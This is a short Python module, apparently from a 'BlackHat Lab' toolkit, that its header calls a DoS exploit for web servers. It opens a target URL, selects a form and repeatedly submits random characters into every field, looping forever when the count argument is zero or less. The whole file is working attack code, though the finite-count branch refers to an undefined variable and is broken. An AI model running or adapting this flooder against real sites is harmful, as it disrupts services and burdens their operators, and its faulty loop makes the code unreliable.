# -*- coding: utf-8 -*-

# © BlackHat Lab 2013-2016
# this module needs for make a dos attack on web server
# Developer: DOCTOR_RABB


__NAME__ = 'WFD (Web Form Doser)'
__VERS__ = '0.1f'
__DESC__ = 'You can use this exploit to dos web servers using a web form'
__AUTHORS__ = [ 'DOCTOR_RABB' ]
__TITLE__ = 'web_doser'

import urllib2
from mechanize import Browser
from random import randint

def run (command_args):

    char_buffer = '`1234567890-=qwertyuiop[]asdfghjkl;\zxcvbnm,./!@#$%~^&*()_+QWERTYUIOP{}ASDFGHJKL:"|ZXCVBNM<>?'

    b = Browser ()
    b.open (command_args [1])
    b.select_form (nr=int (command_args [2]))

    if int (command_args [3]) <= 0:
	while True:
	    for i in b.controls:
		b [i.name] = char_buffer [randint (0, len (char_buffer)-1)]
	    b.submit ()
    else:
	for i in range (time+1):
	    for i in b.controls:
		b [i.name] = char_buffer [randint (0, len (char_buffer)-1)]
	    b.submit ()
